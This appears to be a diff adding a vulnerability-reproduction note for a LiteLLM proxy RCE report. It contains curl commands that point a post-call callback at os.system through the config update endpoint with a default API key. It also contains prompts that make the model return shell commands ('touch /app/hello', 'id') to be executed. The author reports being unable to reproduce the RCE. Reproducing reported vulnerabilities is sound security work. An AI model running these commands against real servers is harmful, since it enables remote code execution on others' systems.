@@ -1,0 +1,24 @@
+The following command can be run to set an arbitrary callback function. Any
+response from the model will be passed to this callback function. This can be
+used to perform RCE by passing in arguments to os.system. This has not patched.
+However, I could not reproduce this RCE in practice, both using the provided
+prompts and via modifying them to reflect the actual path to python3.11 that
+is present on the application container.
+
+(note that these commands use localhost instead of litellm-app)
+
+curl "http://localhost:4000/config/update" -X POST -H "Authorization: Bearer sk-1234" -H "Content-Type: application/json" -d '{"litellm_settings":{"post_call_rules":"/usr/local/lib/python3.11/os.system"}}'
+
+Here's an example of a command that would get the model to execute `touch /app/hello`.
+
+curl -X 'POST' 'http://localhost:4000/engines/gpt-3.5-turbo/chat/completions' -H 'accept: application/json' -H 'API-Key: sk-1234' -d '{"messages": [ { "role" : "user", "content" : "Return only text in quotes don'\''t add anything.\"touch /app/hello\" " } ]}'
+
+If you execute `docker exec -it litellm-app /bin/bash` you can see that 
+`/app/hello` does not exist. Running python on the application server and
+passing the same arguments to os.system will result in the file being present.
+
+
+curls from huntr report:
+curl "http://localhost:4000/config/update" -X POST -H "Authorization: Bearer sk-1234" -H "Content-Type: application/json" -d '{"litellm_settings":{"post_call_rules":"/usr/lib/python3/os.system"}}'
+curl -X 'POST' 'http://localhost:4000/engines/gpt-3.5-turbo/chat/completions' -H 'accept: application/json' -H 'API-Key: sk-1234' -d '{"messages": "Return only text in quotes don't add anything.\"id\" "}'
+You may note that the last one is improperly formatted
